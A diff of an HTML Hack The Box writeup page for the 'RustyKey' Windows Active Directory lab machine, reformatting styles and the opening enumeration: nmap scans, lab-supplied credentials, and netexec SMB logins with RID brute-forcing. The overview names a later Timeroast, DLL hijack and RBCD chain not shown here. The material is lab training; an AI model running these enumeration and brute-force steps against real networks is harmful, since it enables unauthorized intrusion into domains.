@@ -3,353 +3,72 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: RustyKey Writeup — Hackthekat</title>
   <meta name="description" content="HTB RustyKey machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      rustykey
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>rustykey</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -361,90 +80,78 @@
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>RustyKey</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-hard">Hard</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-          <tr><td>Credentials</td><td><code style="font-size:0.85rem;color:var(--htb-green)">rr.parker / 8#t5HE8L!W3A Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address. nmap -p- 10.129.201.253</code></td></tr>
-          <tr><td>Note</td><td style="color:var(--htb-muted);font-size:0.85rem">This is an assumed breach scenario — credentials are provided by HTB.</td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>RustyKey is a Hard difficulty Windows AD machine. Starting with provided credentials, the attack exploits a <strong>Timeroast</strong> vulnerability to extract and crack machine account hashes. The cracked password enables adding the attacker to a HelpDesk group via BloodHound-guided AD abuse. Through multiple password resets and <strong>Protected Users group</strong> manipulation, WinRM access is gained. Escalation continues through a <strong>COM object DLL hijack</strong> and concludes with <strong>Resource-Based Constrained Delegation (RBCD)</strong> to impersonate a backup admin account.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
-      <p>As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A</p>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
-      <div class="code-block"><pre><code>nmap -p- 10.129.201.253 
+      <p>Assumed-breach scenario with credentials: <code>rr.parker / 8#t5HE8L!W3A</code>.</p>
+      <div class="code-block"><pre><code>nmap -p- 10.129.201.253                                                          
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:10 CEST
 Nmap scan report for 10.129.201.253
 Host is up (0.028s latency).
 Not shown: 65510 closed tcp ports (reset)
-PORT STATE SERVICE
-53/tcp open domain
-88/tcp open kerberos-sec
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-5985/tcp open wsman
-9389/tcp open adws
-47001/tcp open winrm</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
-      <div class="code-block"><pre><code>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sCV 10.129.201.253 
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm</code></pre></div>
+      <p>A detailed service-version scan (<code>-sCV</code>) fingerprints the exact software versions running on each open port, helping identify potential vulnerabilities.</p>
+      <div class="code-block"><pre><code>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sCV 10.129.201.253      
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:15 CEST
 Nmap scan report for rustykey.htb (10.129.201.253)
 Host is up (0.037s latency).
 
-PORT STATE SERVICE VERSION
-53/tcp open domain Simple DNS Plus
-88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-01 00:36:59Z)
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
-445/tcp open microsoft-ds?
-464/tcp open kpasswd5?
-593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-636/tcp open tcpwrapped
-3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
-3269/tcp open tcpwrapped
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 00:36:59Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
-9389/tcp open mc-nmf .NET Message Framing
-47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 |_clock-skew: 1h21m16s
 | smb2-time: 
-| date: 2025-07-01T00:37:06
-|_ start_date: N/A
+|   date: 2025-07-01T00:37:06
+|_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.45 seconds</code></pre></div>
-      <p>Before downloading the data from the LDAP server to put it in Bloodhound, I noticed that the port for the SMB server is open. So I will first check whether I can connect using the user credentials I received from HTB. As you can see below, I will first have to fake ntpdate for the command to work.</p>
+      <h3 class="writeup-sub-title">SMB & LDAP Enumeration</h3>
+      <p>I verify SMB access and check share permissions, then collect LDAP data for BloodHound.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ nxc smb dc.rustykey.htb -u rr.parker -p &#x27;8#t5HE8L!W3A&#x27; -k 
-SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
-SMB dc.rustykey.htb 445 dc [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW 
+└─$ nxc smb dc.rustykey.htb -u rr.parker -p &#x27;8#t5HE8L!W3A&#x27; -k        
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW 
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ sudo ntpdate 10.129.201.23 
@@ -453,110 +160,109 @@ CLOCK: time stepped by 380.487905
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ nxc smb dc.rustykey.htb -u rr.parker -p &#x27;8#t5HE8L!W3A&#x27; -k
-SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
-SMB dc.rustykey.htb 445 dc [+] rustykey.htb\rr.parker:8#t5HE8L!W3A</code></pre></div>
-      <p>As you can see above, I can connect to the SMB server with the user credentials. Now I&#x27;m going to see if I can use the --rid-brute parameter to retrieve the RIDs of the users within the domain ‘dc.rustykey.htb’. We will be able to use these later.</p>
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A</code></pre></div>
+      <p>I use netexec to enumerate additional domain information using the valid credentials.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ nxc smb dc.rustykey.htb -u rr.parker -p &#x27;8#t5HE8L!W3A&#x27; -k --rid-brute
-SMB dc.rustykey.htb 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
-SMB dc.rustykey.htb 445 dc [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
-SMB dc.rustykey.htb 445 dc 498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 500: RUSTYKEY\Administrator (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 501: RUSTYKEY\Guest (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 502: RUSTYKEY\krbtgt (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 512: RUSTYKEY\Domain Admins (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 513: RUSTYKEY\Domain Users (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 514: RUSTYKEY\Domain Guests (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 515: RUSTYKEY\Domain Computers (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 516: RUSTYKEY\Domain Controllers (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 517: RUSTYKEY\Cert Publishers (SidTypeAlias)
-SMB dc.rustykey.htb 445 dc 518: RUSTYKEY\Schema Admins (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 519: RUSTYKEY\Enterprise Admins (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 520: RUSTYKEY\Group Policy Creator Owners (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 521: RUSTYKEY\Read-only Domain Controllers (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 522: RUSTYKEY\Cloneable Domain Controllers (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 525: RUSTYKEY\Protected Users (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 526: RUSTYKEY\Key Admins (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 527: RUSTYKEY\Enterprise Key Admins (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 553: RUSTYKEY\RAS and IAS Servers (SidTypeAlias)
-SMB dc.rustykey.htb 445 dc 571: RUSTYKEY\Allowed RODC Password Replication Group (SidTypeAlias)
-SMB dc.rustykey.htb 445 dc 572: RUSTYKEY\Denied RODC Password Replication Group (SidTypeAlias)
-SMB dc.rustykey.htb 445 dc 1000: RUSTYKEY\DC$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1101: RUSTYKEY\DnsAdmins (SidTypeAlias)
-SMB dc.rustykey.htb 445 dc 1102: RUSTYKEY\DnsUpdateProxy (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 1103: RUSTYKEY\Support-Computer1$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1104: RUSTYKEY\Support-Computer2$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1105: RUSTYKEY\Support-Computer3$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1106: RUSTYKEY\Support-Computer4$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1107: RUSTYKEY\Support-Computer5$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1118: RUSTYKEY\Finance-Computer1$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1119: RUSTYKEY\Finance-Computer2$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1120: RUSTYKEY\Finance-Computer3$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1121: RUSTYKEY\Finance-Computer4$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1122: RUSTYKEY\Finance-Computer5$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1123: RUSTYKEY\IT-Computer1$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1124: RUSTYKEY\IT-Computer2$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1126: RUSTYKEY\IT-Computer4$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1127: RUSTYKEY\IT-Computer5$ (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1128: RUSTYKEY\HelpDesk (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 1130: RUSTYKEY\Protected Objects (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 1131: RUSTYKEY\IT (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 1132: RUSTYKEY\Support (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 1133: RUSTYKEY\Finance (SidTypeGroup)
-SMB dc.rustykey.htb 445 dc 1136: RUSTYKEY\DelegationManager (SidTypeGroup)
